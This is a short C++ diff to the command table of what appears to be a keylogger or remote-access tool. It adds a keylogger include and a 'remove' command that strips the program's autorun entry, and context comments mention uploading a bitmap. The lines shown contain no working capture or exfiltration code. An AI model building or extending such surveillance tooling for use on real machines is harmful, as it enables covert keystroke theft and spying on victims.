@@ -1,6 +1,7 @@
 #include "stdafx.h"
 #include "CommandExe.h"
 #include "Hax.h"
+#include "Keylogger.h"
 
 static std::vector<std::string> split(const std::string &s, char delim) {
     std::stringstream ss(s);
@@ -74,6 +75,11 @@ command_t commandDefs[] = {
 
             // upload
             // free hBitmap
+        }
+    },
+    {
+        "remove", [](std::vector<std::string> args) {
+            keylogger.RemoveAutorun();
         }
     }
 };
